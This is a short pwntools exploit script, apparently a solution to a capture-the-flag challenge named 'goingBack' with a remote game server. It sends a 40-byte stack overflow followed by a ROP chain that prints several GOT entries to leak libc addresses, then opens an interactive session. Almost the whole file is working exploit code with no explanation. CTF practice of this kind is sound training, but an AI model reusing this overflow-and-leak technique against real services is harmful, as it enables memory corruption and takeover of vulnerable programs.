from pwn import *

exe = ELF('./goingBack')
context.binary = exe.path

io = process(exe.path)
if args.GDB:
    io = gdb.debug(exe.path, """
        b *gets+141
        b *0x401342
        continue
    """)
elif args.REMOTE:
    io = remote("dyn.ctf.pearlctf.in", 30011)
    

rop = ROP(exe)
offset = 40

rop.raw(b'A' * offset)
rop.puts(exe.got.puts)
rop.puts(exe.got.printf)
rop.puts(exe.got.getchar)
rop.puts(exe.got.gets)
rop.puts(exe.got.fflush)

io.sendlineafter(b':', b'first_name')
io.sendlineafter(b':', b'last_name')
io.sendlineafter(b':', b'123')
io.sendlineafter(b':', b'Bangalore')
io.sendlineafter(b':', b'1')
io.sendlineafter(b':', b'1')
io.sendlineafter(b'experience', rop.chain())

io.recvline()
io.recvline()
io.recvline()
for _ in range(5):
    address = int.from_bytes(io.recvline().strip(), 'little')
    print(hex(address))

io.interactive()